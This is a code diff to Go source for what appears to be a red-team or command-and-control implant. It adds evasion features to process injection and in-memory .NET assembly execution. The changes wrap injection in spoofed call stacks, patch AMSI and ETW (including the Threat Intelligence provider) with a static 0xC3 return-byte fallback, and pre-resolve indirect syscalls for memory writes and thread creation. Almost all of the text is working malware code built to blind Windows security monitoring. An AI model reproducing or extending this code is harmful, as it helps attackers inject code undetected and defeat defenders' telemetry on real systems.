@@ -135,6 +135,17 @@ func injectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windo
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte, rwxPages bool) error {
+	// {{if .Config.Evasion}}
+	// Wrap injection with spoofed thread stack to evade call-stack analysis
+	return evasion.WithSpoofedStack(func() error {
+		return remoteTaskInner(processID, data, rwxPages)
+	})
+	// {{else}}
+	return remoteTaskInner(processID, data, rwxPages)
+	// {{end}}
+}
+
+func remoteTaskInner(processID int, data []byte, rwxPages bool) error {
 	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
@@ -160,6 +171,16 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 func LocalTask(data []byte, rwxPages bool) error {
+	// {{if .Config.Evasion}}
+	return evasion.WithSpoofedStack(func() error {
+		return localTaskInner(data, rwxPages)
+	})
+	// {{else}}
+	return localTaskInner(data, rwxPages)
+	// {{end}}
+}
+
+func localTaskInner(data []byte, rwxPages bool) error {
 	var err error
 	if runtime.GOARCH == "amd64" {
 		err = refresh()
@@ -197,13 +218,22 @@ func LocalTask(data []byte, rwxPages bool) error {
 }
 
 func patchAmsi() error {
-	// load amsi.dll
+	// {{if .Config.Evasion}}
+	// Use dynamic hash-based patching first (xor eax,eax; ret → AMSI_RESULT_CLEAN)
+	err := evasion.DynamicPatchAmsi()
+	if err == nil {
+		return nil
+	}
+	// {{end}}
+	// Fallback: legacy static 0xC3 patch
+	// {{if .Config.Debug}}
+	log.Println("DynamicPatchAmsi failed, falling back to static patch")
+	// {{end}}
 	amsiDLL := windows.NewLazyDLL("amsi.dll")
 	amsiScanBuffer := amsiDLL.NewProc("AmsiScanBuffer")
 	amsiInitialize := amsiDLL.NewProc("AmsiInitialize")
 	amsiScanString := amsiDLL.NewProc("AmsiScanString")
 
-	// patch
 	amsiAddr := []uintptr{
 		amsiScanBuffer.Addr(),
 		amsiInitialize.Addr(),
@@ -211,59 +241,49 @@ func patchAmsi() error {
 	}
 	patch := byte(0xC3)
 	for _, addr := range amsiAddr {
-		// skip if already patched
 		if *(*byte)(unsafe.Pointer(addr)) != patch {
 			// {{if .Config.Debug}}
-			log.Println("Patching AMSI")
+			log.Println("Patching AMSI (legacy)")
 			// {{end}}
 			var oldProtect uint32
 			err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect)
 			if err != nil {
-				//{{if .Config.Debug}}
-				log.Println("VirtualProtect failed:", err)
-				//{{end}}
 				return err
 			}
 			*(*byte)(unsafe.Pointer(addr)) = 0xC3
-			err = windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
-			if err != nil {
-				//{{if .Config.Debug}}
-				log.Println("VirtualProtect (restauring) failed:", err)
-				//{{end}}
-				return err
-			}
+			windows.VirtualProtect(addr, 1, oldProtect, &oldProtect)
 		}
 	}
 	return nil
 }
 
 func patchEtw() error {
+	// {{if .Config.Evasion}}
+	// Use dynamic hash-based patching (includes ETW Threat Intelligence provider)
+	err := evasion.DynamicPatchEtw()
+	if err == nil {
+		return nil
+	}
+	// {{end}}
+	// Fallback: legacy static 0xC3 patch
+	// {{if .Config.Debug}}
+	log.Println("DynamicPatchEtw failed, falling back to static patch")
+	// {{end}}
 	ntdll := windows.NewLazyDLL("ntdll.dll")
 	etwEventWriteProc := ntdll.NewProc("EtwEventWrite")
 
-	// patch
 	patch := byte(0xC3)
-	// skip if already patched
 	if *(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) != patch {
 		// {{if .Config.Debug}}
-		log.Println("Patching ETW")
+		log.Println("Patching ETW (legacy)")
 		// {{end}}
 		var oldProtect uint32
 		err := windows.VirtualProtect(etwEventWriteProc.Addr(), 1, windows.PAGE_READWRITE, &oldProtect)
 		if err != nil {
-			//{{if .Config.Debug}}
-			log.Println("VirtualProtect failed:", err)
-			//{{end}}
 			return err
 		}
 		*(*byte)(unsafe.Pointer(etwEventWriteProc.Addr())) = 0xC3
-		err = windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
-		if err != nil {
-			//{{if .Config.Debug}}
-			log.Println("VirtualProtect (restauring) failed:", err)
-			//{{end}}
-			return err
-		}
+		windows.VirtualProtect(etwEventWriteProc.Addr(), 1, oldProtect, &oldProtect)
 	}
 	return nil
 }
@@ -283,7 +303,21 @@ func InProcExecuteAssembly(assemblyBytes []byte, assemblyArgs []string, runtime 
 		}
 	}
 
+	// {{if .Config.Evasion}}
+	// Execute assembly with spoofed thread stack to evade call-stack analysis
+	var assemblyResult string
+	var assemblyErr error
+	innerErr := evasion.WithSpoofedStack(func() error {
+		assemblyResult, assemblyErr = LoadAssembly(assemblyBytes, assemblyArgs, runtime)
+		return assemblyErr
+	})
+	if innerErr != nil {
+		return "", innerErr
+	}
+	return assemblyResult, assemblyErr
+	// {{else}}
 	return LoadAssembly(assemblyBytes, assemblyArgs, runtime)
+	// {{end}}
 }
 
 func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uint32) (string, error) {
@@ -431,6 +465,17 @@ func refresh() error {
 			return err
 		}
 	}
+	// {{end}}
+	// {{if .Config.Evasion}}
+	// Pre-resolve indirect syscall entries for hot-path operations
+	// This caches SSNs and the syscall gadget so that injection paths
+	// can use indirect syscalls without paying the resolution cost each time
+	go func() {
+		_, _ = evasion.ResolveSyscall("NtAllocateVirtualMemory")
+		_, _ = evasion.ResolveSyscall("NtWriteVirtualMemory")
+		_, _ = evasion.ResolveSyscall("NtCreateThreadEx")
+		_, _ = evasion.ResolveSyscall("NtProtectVirtualMemory")
+	}()
 	// {{end}}
 	return nil
 }
